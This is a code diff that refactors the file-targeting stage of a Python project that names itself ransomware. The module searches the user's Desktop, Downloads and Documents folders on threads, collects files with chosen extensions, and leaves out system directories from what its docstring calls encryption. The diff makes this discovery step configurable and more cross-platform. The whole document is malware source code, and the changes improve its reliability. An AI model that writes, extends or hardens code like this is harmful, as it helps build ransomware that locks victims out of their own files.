@@ -3,8 +3,8 @@
 #=========================================================
 #This Module is Written to Execute Stage2 of Ransomeware
 #=========================================================
-# Stage1
-#	|____*****TAKES NO ARGUMENTS*****
+# Stage2
+#	|____*****TAKES target_extensions and target_directories as ARGUMENTS*****
 #	|____Searches for Target Extension Files on Different Thread
 #	|____*****RETURN : List of TARGET Files*****
 
@@ -13,64 +13,58 @@ import os, time
 import threading #Using Threads to Boost Search Process BY Searching Diff. Drive on Diff. Thread
 from os.path import expanduser
 from pathlib import Path #Used to Find the Home Path
-import configparser, ast  #Used to Retrive Settings from config.txt
-
 
 #Stage2 is Initiated By (Stage2 Class), which depends on (LocateTargetFiles Class)
 class Stage2:
-    def __init__(self):
+    def __init__(self, target_extensions=['.lol', '.mrrobot'], target_directories=['Desktop', 'Downloads', 'Documents']):
         self.list_of_files = []
+        self.target_extensions = target_extensions
+        self.target_directories = target_directories
 
-    def start(self):               
+    def start(self):
         home = self.get_home_dir()
-        target1 = home + "Pictures"
-        target2 = home + "Music"
-        target3 = home + "Downloads"
-        target4 = home + "Documents"
-        target5 = home + "Desktop"
-            
-        t1 = threading.Thread(target=self.run_locate_class, args=[target1,])
-        t2 = threading.Thread(target=self.run_locate_class, args=[target2,])
-        t3 = threading.Thread(target=self.run_locate_class, args=[target3,])
-        t4 = threading.Thread(target=self.run_locate_class, args=[target4,])
-        t5 = threading.Thread(target=self.run_locate_class, args=[target5,])
-        t1.start()   
-        t1.join()   
-        t2.start() 
-        t2.join() 
-        t3.start() 
-        t3.join() 
-        t4.start() 
-        t4.join() 
-        t5.start()
-        t5.join()
-        
+
+        threads = []
+        for directory in self.target_directories:
+            # It's safer to use os.path.join, especially for cross-platform compatibility
+            # and to avoid issues with missing slashes.
+            full_path = os.path.join(home, directory)
+            if os.path.exists(full_path):
+                t = threading.Thread(target=self.run_locate_class, args=[full_path,])
+                threads.append(t)
+                t.start()
+            else:
+                print(f"[!] Directory not found: {full_path}")
+
+        for t in threads:
+            t.join()
+
         with open('log.txt' , 'w') as f:
             for files in self.list_of_files:
                 f.write(files+'\n')
-                
+
         return self.list_of_files
-    
+
     def get_home_dir(self):
-        return str(Path.home()) + '\\'
-    
+        # Using expanduser is a more robust way to get the home directory
+        return str(Path.home())
+
     def run_locate_class(self, drive_name):
         '''
         Function to make Object of LocateTargetFiles Class
         '''
-        starting = LocateTargetFiles()
+        starting = LocateTargetFiles(self.target_extensions)
         list_of_files = starting.start(drive_name)
         self.list_of_files.extend(list_of_files)
         return True
 
 class LocateTargetFiles:
-    def __init__(self, exclude = None):
+    def __init__(self, target_extensions, exclude = None):
         self.files_on_system = []
-        
-        config = configparser.RawConfigParser()
-        config.read('config.txt')
-        self.target_extension = ast.literal_eval(config.get("TARGET_EXTENSIONS", "list1"))  #Retriving From config.txt 
-        self.exclude_dir = ast.literal_eval(config.get("EXCLUDED_DIRECTORY", "list1"))   #Retriving From config.txt
+        self.target_extension = target_extensions
+        # In the future, this could also be configurable
+        # For safety, we will always exclude these directories.
+        self.exclude_dir = ['C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)', '/usr', '/bin', '/etc']
         if exclude != None:
             self.exclude_dir.extend(exclude)
 
@@ -83,12 +77,12 @@ class LocateTargetFiles:
             for f in files:
                 abs_file_path = os.path.join(root, f)
                 self.filter(self.target_extension, abs_file_path)
-                
+
     def filter(self, target_extension, abs_file_path):
         if self.is_excluded_dir(abs_file_path) == False:
-            # Filtering Files On the basics of file extension 
-            if abs_file_path.split('.')[-1] in self.target_extension and abs_file_path.split('\\')[-1] != 'log.txt':
-                self.files_on_system.append(abs_file_path) 
+            # Filtering Files On the basics of file extension
+            if os.path.splitext(abs_file_path)[1] in self.target_extension and os.path.basename(abs_file_path) != 'log.txt':
+                self.files_on_system.append(abs_file_path)
             else:
                 pass
 
@@ -98,35 +92,10 @@ class LocateTargetFiles:
         @param path: The path to check
         @return: True if the path should be excluded from encryption, otherwise False
         '''
-      
+        # Normalize paths for consistent comparison
+        normalized_path = os.path.normpath(path)
         for dir_to_exclude in self.exclude_dir:
-            lenght = len(dir_to_exclude)
-            if path[:lenght] == dir_to_exclude:
-                return True          
-        return False            
-        
-            
-    
-                 
-
-if __name__ == '__main__':
-    test = Stage2()
-    list_of_files = test.start()
-    
-    print(f"[+] Total Number of Files : {len(list_of_files)}\n")
-    
-    time.sleep(4)
-    for file in list_of_files:
-        print(file)
-    
-    '''
-    #Testing Class == LocateTargetFiles
-    absolue_path = input("Enter Absolute Path : ")
-    exclude_dir = ['C:\\Users\\satender singh\\Desktop\\Ransomeware\\2',]
-
-    test = LocateTargetFiles(exclude_dir)
-    files_on_system = test.start(absolue_path)
-
-    for file in files_on_system:
-        print(file)
-    '''        
+            normalized_exclude_dir = os.path.normpath(dir_to_exclude)
+            if normalized_path.startswith(normalized_exclude_dir):
+                return True
+        return False
